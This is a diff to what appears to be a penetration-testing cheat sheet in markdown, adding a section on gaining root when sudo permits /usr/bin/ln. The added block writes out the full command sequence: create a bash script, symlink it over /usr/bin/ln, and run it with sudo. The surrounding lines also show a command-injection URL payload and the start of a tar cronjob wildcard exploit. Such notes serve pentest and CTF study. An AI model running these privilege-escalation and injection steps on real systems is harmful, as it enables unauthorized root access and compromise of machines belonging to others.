@@ -126,6 +126,17 @@ Login as any user to see that it gets logged then try to login with a malicious 
 
 Then `http://ip/page?a=whoami;`
 
+### Getting root with ln (symlink)
+
+If we have permissions to run /usr/bin/ln as root we can onw the machine
+```
+echo 'bash' > root
+chmod +x root 
+sudo /usr/bin/ln -sf /tmp/root /usr/bin/ln
+sudo /usr/bin/ln
+
+```
+
 ### Tar Exploitation
 
 When ever you see a cronjob running with a command `cd /<user>/andre/backup tar -zcf /<folder>/filetar.gz *` go to that folder from which a backup is being created and running these command in that directory <br/ >
